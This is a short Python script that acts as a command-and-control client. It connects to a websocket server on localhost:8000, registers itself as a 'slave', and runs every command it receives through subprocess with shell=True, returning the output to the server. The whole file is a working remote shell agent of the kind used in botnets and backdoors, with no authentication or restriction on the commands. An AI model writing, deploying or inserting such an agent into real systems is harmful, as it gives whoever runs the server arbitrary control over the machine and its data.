from websocket import create_connection
import time
import json
import subprocess

ws = create_connection("ws://localhost:8000")

def send(data):
    global ws
    ws.send(json.dumps(data))
    return

def receive():
    global ws
    return json.loads(ws.recv())

result = ws.recv()
print(result)
send({'role':'slave'})
result = ws.recv()
print(result)
while True:
    result = receive()
    if 'command' in result:
        try:
            result = subprocess.check_output(result['command'],shell=True).decode("utf-8","ignore")
        except:
            pass
        print(result)
        send({'result':result})
    time.sleep(1)
